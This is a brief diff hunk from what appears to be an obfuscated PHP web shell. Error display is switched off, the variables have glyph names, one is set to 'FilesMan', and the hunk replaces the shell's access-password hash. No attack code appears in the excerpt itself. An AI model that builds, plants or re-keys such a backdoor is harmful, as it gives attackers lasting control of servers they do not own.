@@ -16,7 +16,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('display_startup_errors', 0);
 
 //-----------------Password---------------------
-$▛ = "6520f9ae77807950a1dda49db15e4a081";
+$▛ = "a01610228fe998f515a72dd730294d87";
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
